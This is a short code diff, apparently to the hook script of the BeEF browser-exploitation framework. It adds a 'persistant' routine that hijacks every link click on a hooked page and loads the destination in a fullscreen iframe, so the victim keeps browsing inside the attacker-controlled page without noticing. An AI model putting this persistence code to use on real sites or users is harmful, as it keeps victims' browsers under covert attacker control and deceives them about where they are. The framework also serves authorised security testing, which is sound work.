@@ -54,7 +54,23 @@ beef.session = {
 		}
 		
 		return hook_session_id;
+	},
+
+	/**
+	 * Overrides each link, and creates an iframe (loading the href) instead of following the link
+	 */
+	persistant: function() {
+		$j('a').click(function(e) {
+			if ($j(this).attr('href') != '')
+			{
+				e.preventDefault();
+				beef.dom.createIframe('fullscreen', {}, $j(this).attr('href'));
+				$j(document).attr('title', $j(this).html());
+			}
+		});
 	}
+	
+
 				
 };
 
